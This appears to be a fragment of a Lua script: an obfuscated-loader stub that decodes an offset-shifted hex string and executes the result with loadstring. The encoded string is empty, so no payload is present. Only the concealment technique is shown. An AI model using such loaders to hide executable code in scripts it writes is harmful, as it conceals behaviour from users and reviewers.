        local e, o, d = "", 49, {}
        for i = 1, #e, 2 do
            local b = tonumber(e:sub(i, i + 1), 16)
            b = (b - o + 256) % 256
            d[#d + 1] = string.char(b)
        end
        local load_func = loadstring or load
        local f = assert(load_func(table.concat(d)))
        return f(...)
    